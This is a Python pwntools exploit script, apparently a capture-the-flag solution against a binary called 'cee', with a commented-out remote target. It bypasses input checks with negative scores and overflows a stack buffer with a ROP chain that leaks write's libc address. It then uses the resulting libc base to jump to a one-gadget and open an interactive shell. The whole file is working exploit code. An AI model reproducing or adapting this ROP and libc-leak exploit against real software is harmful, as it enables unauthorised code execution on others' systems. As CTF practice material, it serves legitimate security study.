from pwn import *

s = process("./cee")
#s = remote("youngju.nefus.kr",3333)
e = ELF("./cee")
context.log_level='debug'
prdi = 0x00400a53
prsi = 0x00400a51
main =  0x00400716
write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']
libc_offset = 0xf72b0

s.sendlineafter('When is the college entrance exam?\n','2018-11-15')
s.sendlineafter('Enter your Korean score :','-1')
s.sendlineafter('Enter your English score :','-1')
s.sendlineafter('Enter your math score :','-1')
s.recvuntil('Please enter your feelings!!\n')

payload = "A"*32
payload += "\x00"*24
payload += p64(prsi)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)


payload += p64(main)
####
 
s.send(payload)
s.recvuntil('Thank You!!')
libc = u64(s.recv(6)+"\x00\x00")
libc_base = libc-libc_offset

log.success("libc_base= "+hex(libc_base))
magic = libc_base + 0x45216
log.success("magic = "+hex(magic))
####
s.sendlineafter('When is the college entrance exam?\n','2018-11-15')
s.sendlineafter('Enter your Korean score :','-1')
s.sendlineafter('Enter your English score :','-1')
s.sendlineafter('Enter your math score :','-1')

s.recvuntil('Please enter your feelings!!\n')
payload2 = "A"*32
payload2 += "\x00"*24
payload2 += p64(magic)

s.send(payload2)
s.interactive()
